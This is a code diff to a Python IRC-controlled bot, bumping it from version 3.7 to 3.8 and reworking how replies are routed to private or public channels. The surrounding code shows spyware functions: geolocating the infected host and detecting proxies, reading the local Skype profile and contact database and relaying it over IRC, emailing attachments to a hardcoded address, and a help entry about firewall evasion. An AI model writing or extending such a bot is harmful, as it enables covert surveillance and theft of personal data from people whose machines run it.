@@ -31,7 +31,7 @@ import skype
 #       status      returns the size of the worker's task queue
 #       openvpn     implement openvpn for firewall evasion
 
-version = "3.7"                                                   # bot version
+version = "3.8"                                                   # bot version
 
 ### Remove/comment this block to disable logging stdout/err to a file
 so = se = open("bot_v%s.log" % version, 'w', 0)
@@ -135,10 +135,12 @@ def parse(data):
             return (False,"","")                     # break and return nothing if message is invalid
         if to_nick == channel:
             source = "public"
+            return_to = channel
         elif to_nick != channel:
-            source = from_nick
-        log("[>]     Content: %s, Source: %s, Return To: %s" % (text, source, from_nick))
-        return (text, source, from_nick)
+            source = "private"
+            return_to = from_nick
+        log("[>]     Content: %s, Source: %s, Return To: %s" % (text, source, return_to))
+        return (text, source, return_to)
     elif data.find("PING :",0,6) != -1:               # was it just a ping?
         from_srv = data.split("PING :")[1].strip()    # the source of the PING
         return ("PING", from_srv, from_srv)
@@ -579,7 +581,7 @@ if __name__ == '__main__':
                             to = "nikisweeting+bot@gmail.com"
                             broadcast(sendmail(to,msg="whohooo",attch=attch))
 
-                        elif content == '!geo' and source:
+                        elif content == '!geo':
                             location = str(geo_locate())
                             broadcast(location)
 
@@ -604,12 +606,12 @@ if __name__ == '__main__':
                             except Exception as python_exception:
                                 broadcast("[X]: %s" % python_exception)
 
-                    elif source != 'public':
+                    elif source == 'private':
                         if content == 'help':
-                            privmsg(helpmsg,to=source)
+                            privmsg(helpmsg,to=return_to)
 
                         elif content == 'version':
-                            privmsg("v"+version,to=source)
+                            privmsg("v"+version,to=return_to)
 
                         elif content == 'identify':
                             full_identify()
@@ -618,27 +620,27 @@ if __name__ == '__main__':
                             location_with_proxy = str(geo_locate(with_proxy=True))
                             location = str(geo_locate())
                             if location_with_proxy == location:
-                                privmsg("Location: %s" % location,to=source)
+                                privmsg("Location: %s" % location,to=return_to)
                             else:
-                                privmsg("Proxy Detected: %s" % location_with_proxy,to=source)
+                                privmsg("Proxy Detected: %s" % location_with_proxy,to=return_to)
                                 sleep(1)
-                                privmsg("Actual Location: %s" % location,to=source)
+                                privmsg("Actual Location: %s" % location,to=return_to)
 
                         elif content == 'skype$profile':
                             try:
-                                privmsg(skype.findProfile(local_user), to=source)
+                                privmsg(skype.findProfile(local_user), to=return_to)
                                 db_path = skype.findProfile(local_user)
                                 for line in skype.printProfile(db_path):
-                                    privmsg(line, to=source)
+                                    privmsg(line, to=return_to)
                                     sleep(1)
                             except Exception as error:
-                                privmsg(str(error), to=source)
+                                privmsg(str(error), to=return_to)
 
                         elif content == 'skype$contacts':
                             try:
                                 db_path = skype.findProfile(local_user)
                                 for line in skype.printProfile(db_path):
-                                    privmsg(line, to=source)
+                                    privmsg(line, to=return_to)
                                     sleep(1)
                                 for line in skype.printContacts(db_path):
                                     signal.signal(signal.SIGALRM, timeout_handler)
@@ -649,15 +651,15 @@ if __name__ == '__main__':
                                         log('[>]    ', data.strip())
                                         if (data.find('!cancel') != -1):
                                             retcode = "Cancelled."
-                                            privmsg("[X]: %s" % retcode, to=source)
+                                            privmsg("[X]: %s" % retcode, to=return_to)
                                             signal.alarm(0)
                                             break
                                     except:
-                                        privmsg(line, to=source)
+                                        privmsg(line, to=return_to)
                                     signal.alarm(0)
 
                             except Exception as error:
-                                privmsg(str(error), to=source)
+                                privmsg(str(error), to=return_to)
 
                         elif content[:6] == 'admin$':
                             admins = content[6:].split(',')
